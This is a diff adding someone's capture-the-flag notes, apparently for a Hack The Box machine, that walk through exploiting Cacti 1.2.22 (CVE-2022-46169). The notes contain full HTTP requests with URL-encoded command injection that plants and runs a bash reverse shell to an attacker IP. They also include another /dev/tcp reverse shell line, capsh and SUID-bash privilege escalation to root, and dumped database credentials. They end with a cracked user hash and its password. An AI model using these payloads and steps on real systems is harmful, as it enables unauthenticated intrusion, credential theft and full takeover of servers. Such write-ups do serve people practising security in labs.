@@ -1,0 +1,128 @@
+Website brings is to a Cacti login version 1.2.22
+
+https://www.rapid7.com/db/modules/exploit/linux/http/cacti_unauthenticated_cmd_injection/
+
+CVE-2022-46169 -> Associated with Cacti 1.2.22 exploit (RCE UnAuth)
+
+/remote_agent.php?action=polldata&poller_id=;echo%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.134%2F4444%200%3E%261%22%20%3E%20rev.sh&host_id=1&local_data_ids[]=6 -> This is URL-Encoded (will need adjusted if hacker-ip changes)
+
+============================ Build Shell File
+GET /remote_agent.php?action=polldata&poller_id=;echo%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.134%2F4444%200%3E%261%22%20%3E%20rev.sh&host_id=1&local_data_ids[]=6 HTTP/1.1
+Host: 10.10.11.211
+X-Forwarded: 127.0.0.1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: CactiDateTime=Sat May 06 2023 02:29:19 GMT-0400 (Eastern Daylight Time); CactiTimeZone=-240; Cacti=997e283bb9ea8c7f903adca3fdbca0a5
+Upgrade-Insecure-Requests: 1
+============================
+
+============================ Send Shell
+GET /remote_agent.php?action=polldata&poller_id=;/bin/bash+rev.sh&host_id=1&local_data_ids[]=6 HTTP/1.1
+Host: 10.10.11.211
+X-Forwarded: 127.0.0.1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: CactiDateTime=Sat May 06 2023 02:29:19 GMT-0400 (Eastern Daylight Time); CactiTimeZone=-240; Cacti=997e283bb9ea8c7f903adca3fdbca0a5
+Upgrade-Insecure-Requests: 1
+Content-Length: 2
+============================
+
+Machine forcing bash exec with /bin/bash
+
+wget http://10.10.14.134:80/linpeas.sh
+
+cat file | base64
+copy to clipboard
+paste on mousepad
+base64 -d file.b64 > newFile
+
+============
+cactiuser:root -> cacti login
+
+To See special files we can use: find / -perm -u=s -type f 2>/dev/null
+capsh --print works and the linpeas enum shows we can run capsh
+the find cmd shows things owned by root that we can possibly run
+capsh is one of them
+
+gtfo bins can help aid us in priv esc
+https://gtfobins.github.io/gtfobins/capsh/
+
+/sbin/capsh --gid=0 --uid=0 -- => esc us to root on the container
+
+[/bin/bash | bash] -i >& /dev/tcp/10.10.14.65/4445 0>&1
+
+After editing a poc github script we have a script to get the shell quickly
+
+After establishing a shell, performing which python[1-3] turns up blank,
+but we get a hit off which script
+
+Upgrade with script : script -qc /bin/bash /dev/null
+
+╔══════════╣ Searching mysql credentials and exec
+Found readable /etc/mysql/my.cnf                                                 
+[client-server]
+socket = /run/mysqld/mysqld.sock
+!includedir /etc/mysql/conf.d/
+!includedir /etc/mysql/mariadb.conf.d/
+
+Searching for aid we figure out that a config.php is used to access the database
+which we figured out is a mysql based system based off the port it uses
+
+cat /var/www/html/include/config.php
+
+$database_type     = 'mysql';
+$database_default  = 'cacti';
+$database_hostname = 'db';
+$database_username = 'root';
+$database_password = 'root';
+$database_port     = '3306';
+$database_retries  = 5;
+$database_ssl      = false;
+$database_ssl_key  = '';
+$database_ssl_cert = '';
+$database_ssl_ca   = '';
+$database_persist  = false;
+
+#$rdatabase_type     = 'mysql';
+#$rdatabase_default  = 'cacti';
+#$rdatabase_hostname = 'localhost';
+#$rdatabase_username = 'cactiuser';
+#$rdatabase_password = 'cactiuser';
+#$rdatabase_port     = '3306';
+#$rdatabase_retries  = 5;
+#$rdatabase_ssl      = false;
+#$rdatabase_ssl_key  = '';
+#$rdatabase_ssl_cert = '';
+#$rdatabase_ssl_ca   = '';
+
+To Access mysql thru terminal : mysql -h db -u root -p -D cacti
+
+After looking at the DB we find something cool
+marcus@monitorstwo.htb:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C
+
+Hash is 61 characters long, sources point to blowfish encryption, hashcat can brute for a crack: If crack failed possibly search around the container for any pointers on how they encrypted the passwords
+
+We were correct on the encryption type
+
+john marcus.hash --wordlist=/usr/share/wordlists/SecLists/Passwords/Leaked-Databases/rockyou-50.txt -> cracked the password after a few minutes
+
+ssh possibly => marcus@10.10.11.211:funkymonkey
+
+The local machine is running the docker
+we can use df -h to find docker dirs on the machine
+
+Then we can as root on a docker, add a file onto the /tmp dir
+
+Then we can run through the various merge ending dirs and see which tmp
+has the newly added file
+
+once we find that dir we can as ROOT move to /bin and perform
+chmod u+s bash, this will allow us on the local machine
+
+To run ./bash -p on the bin dir of the container, thus Priv Esc to Root
